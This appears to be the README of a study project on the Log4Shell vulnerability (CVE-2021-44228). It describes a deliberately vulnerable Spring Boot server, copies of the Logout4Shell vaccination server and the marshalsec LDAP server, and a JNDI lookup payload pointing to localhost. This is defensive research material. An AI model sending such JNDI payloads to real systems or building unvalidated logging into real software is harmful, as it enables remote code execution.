# oregon

Project to look at [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

## Structure

Naming convention for our stuff will be Oregon cities, we'll keep the names of copied code from cybereason and mbechler.

* oregon Our parent project.
* [ashland](ashland/README.md) Our vulnerable server.
* [logout4shell](logout4shell/README.md) Copied [Logout4Shell](https://github.com/Cybereason/Logout4Shell) vaccination server.
* [marshalsec](marshalsec/README.md) Copied marshalsec ldap server.



## Immunize



    ${jndi:ldap://localhost:1389/a}



## Narrative


Log4j bug.  I suppose the first thing to do, to understand what is going on, is to set up a vulnerable server.

We'll call it ashland, and it will be a spring boot Java server with a vulnerable Log4J version.

We'll make it easy to exploit, by not validating fields, and logging whatever is entered.

Now that we have a vulnerable server, let's set up the vaccination servers.

We'll need a [pre-8.121 JDK](https://www.oracle.com/java/technologies/javase/8u121-relnotes.html), say
8.112, found [here](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).

Still not able to [exploit](https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot).

We'll need to [update](https://docs.spring.io/spring-boot/docs/current/reference/html/howto.html#howto.logging.log4j) the default logging in Spring.



